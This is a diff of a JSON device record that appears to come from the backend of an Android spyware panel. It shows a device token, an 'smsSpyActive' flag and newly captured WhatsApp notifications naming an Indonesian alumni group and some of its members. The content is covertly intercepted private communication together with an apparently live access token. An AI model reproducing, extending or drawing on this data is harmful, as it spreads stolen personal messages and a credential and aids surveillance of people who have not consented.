@@ -9345,7 +9345,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777248730475,
+    "lastSeen": 1777248742480,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -9361,6 +9361,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎13 pesan dari 5 chat",
+        "time": "27/04 08:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777248743786
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Grup ALUMNI SD MUHAMMADIYAH (5 pesan): ~ Uwais Al Qorni",
+        "content": "💟 Stiker",
+        "time": "27/04 08:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777248743531
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Grup ALUMNI SD MUHAMMADIYAH (4 pesan): ~ Mr. Bayu(Bahruddin Yusuf)",
